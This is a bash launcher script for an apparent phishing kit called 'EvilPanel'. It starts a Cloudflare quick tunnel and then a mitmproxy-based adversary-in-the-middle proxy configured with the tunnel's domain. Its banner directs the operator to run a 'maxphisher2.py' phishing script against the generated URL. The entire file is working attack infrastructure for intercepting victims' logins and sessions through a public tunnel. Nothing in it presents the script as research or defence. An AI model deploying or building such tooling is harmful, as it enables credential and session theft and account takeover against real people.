#!/bin/bash
# /opt/evilpanel/start_tunneled.sh
# VPS-side script to start AiTM tunnel
#
# CRITICAL: Cloudflared starts FIRST to get URL, THEN mitmproxy starts
# This ensures EVILPANEL_DOMAIN is correct when mitmproxy imports addon

set -e

# Configuration
EVILPANEL_DIR="/opt/evilpanel"
LOG_DIR="/tmp"
MITMPROXY_LOG="$LOG_DIR/mitmproxy.log"
CLOUDFLARED_LOG="$LOG_DIR/cloudflared.log"
TUNNEL_URL_FILE="$LOG_DIR/tunnel_url.txt"
LISTEN_PORT=8443
STARTUP_TIMEOUT=30

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║     EvilPanel Tunneled AiTM Launcher v2.0                  ║"
echo "║     CORRECTED: Cloudflared FIRST, then mitmproxy           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    pkill -f "mitmproxy_addon" 2>/dev/null || true
    pkill -f "cloudflared.*$LISTEN_PORT" 2>/dev/null || true
    rm -f "$MITMPROXY_LOG" "$CLOUDFLARED_LOG" "$TUNNEL_URL_FILE" 2>/dev/null || true
}
trap cleanup EXIT

# ==================== STEP 1: KILL EXISTING ====================
echo -e "${YELLOW}[1/5] Killing existing processes...${NC}"
pkill -f "mitmproxy_addon" 2>/dev/null || true
pkill -f "cloudflared.*$LISTEN_PORT" 2>/dev/null || true
sleep 2

# ==================== STEP 2: START CLOUDFLARED FIRST ====================
# CRITICAL: Start cloudflared BEFORE mitmproxy to get the tunnel URL
# Cloudflared will show connection errors but WILL generate the URL
echo -e "${YELLOW}[2/5] Starting cloudflared tunnel (getting URL first)...${NC}"

cloudflared tunnel --url "http://127.0.0.1:$LISTEN_PORT" > "$CLOUDFLARED_LOG" 2>&1 &
CLOUDFLARED_PID=$!

# Extract tunnel URL (cloudflared generates URL immediately)
echo -n "    Waiting for tunnel URL"
TUNNEL_URL=""
for i in $(seq 1 $STARTUP_TIMEOUT); do
    TUNNEL_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' "$CLOUDFLARED_LOG" 2>/dev/null | head -1)
    if [ -n "$TUNNEL_URL" ]; then
        echo -e " ${GREEN}OK${NC}"
        break
    fi
    echo -n "."
    sleep 1
done

if [ -z "$TUNNEL_URL" ]; then
    echo -e " ${RED}FAILED${NC}"
    echo "cloudflared log:"
    cat "$CLOUDFLARED_LOG"
    exit 1
fi

# Extract domain from URL
TUNNEL_DOMAIN=$(echo "$TUNNEL_URL" | sed 's|https://||')
echo -e "${GREEN}[+] Tunnel URL: $TUNNEL_URL${NC}"
echo -e "${GREEN}[+] Tunnel Domain: $TUNNEL_DOMAIN${NC}"

# Save URL to file for retrieval
echo "$TUNNEL_URL" > "$TUNNEL_URL_FILE"

# ==================== STEP 3: SET ENVIRONMENT ====================
echo -e "${YELLOW}[3/5] Setting EVILPANEL_DOMAIN=$TUNNEL_DOMAIN${NC}"
export EVILPANEL_DOMAIN="$TUNNEL_DOMAIN"
export EVILPANEL_DATA="/opt/evilpanel/data"
export EVILPANEL_DEBUG="true"

# ==================== STEP 4: START MITMPROXY ====================
# NOW start mitmproxy - it will read the CORRECT domain from env
echo -e "${YELLOW}[4/5] Starting mitmproxy with correct domain...${NC}"
cd "$EVILPANEL_DIR"

python3 run_tunnel_mode.py > "$MITMPROXY_LOG" 2>&1 &
MITMPROXY_PID=$!

# Wait for mitmproxy to be ready
echo -n "    Waiting for mitmproxy"
for i in $(seq 1 $STARTUP_TIMEOUT); do
    # Check if process is still running
    if ! ps -p $MITMPROXY_PID > /dev/null 2>&1; then
        echo -e " ${RED}CRASHED${NC}"
        echo "mitmproxy log:"
        cat "$MITMPROXY_LOG"
        exit 1
    fi
    
    # Check if it's responding (will get 502 since upstream might fail, but that's OK)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$LISTEN_PORT" 2>/dev/null || echo "000")
    if [ "$HTTP_CODE" != "000" ]; then
        echo -e " ${GREEN}OK${NC}"
        break
    fi
    echo -n "."
    sleep 1
done

# ==================== STEP 5: VERIFY ====================
echo -e "${YELLOW}[5/5] Verifying setup...${NC}"

# Check cloudflared is still running
if ! ps -p $CLOUDFLARED_PID > /dev/null 2>&1; then
    echo -e "${RED}[!] cloudflared died${NC}"
    cat "$CLOUDFLARED_LOG"
    exit 1
fi

# Check mitmproxy is still running
if ! ps -p $MITMPROXY_PID > /dev/null 2>&1; then
    echo -e "${RED}[!] mitmproxy died${NC}"
    cat "$MITMPROXY_LOG"
    exit 1
fi

echo -e "${GREEN}[+] Both processes running${NC}"

# ==================== SUCCESS ====================
echo ""
echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  ${GREEN}AiTM TUNNEL READY${CYAN}                                         ║${NC}"
echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║                                                            ║${NC}"
echo -e "${CYAN}║  Tunnel URL: ${GREEN}$TUNNEL_URL${NC}"
echo -e "${CYAN}║                                                            ║${NC}"
echo -e "${CYAN}║  ${YELLOW}On LOCAL machine, run:${NC}"
echo -e "${CYAN}║  ${GREEN}export EVILPANEL_URL=\"$TUNNEL_URL\"${NC}"
echo -e "${CYAN}║  ${GREEN}python3 core/maxphisher2.py${NC}"
echo -e "${CYAN}║                                                            ║${NC}"
echo -e "${CYAN}║  Processes:                                                ║${NC}"
echo -e "${CYAN}║    cloudflared PID: $CLOUDFLARED_PID                       ${NC}"
echo -e "${CYAN}║    mitmproxy PID:   $MITMPROXY_PID                         ${NC}"
echo -e "${CYAN}║                                                            ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Keep running (foreground mode for monitoring)
echo -e "${YELLOW}[*] Tailing logs... Press Ctrl+C to stop${NC}"
echo ""
tail -f "$MITMPROXY_LOG" "$CLOUDFLARED_LOG"
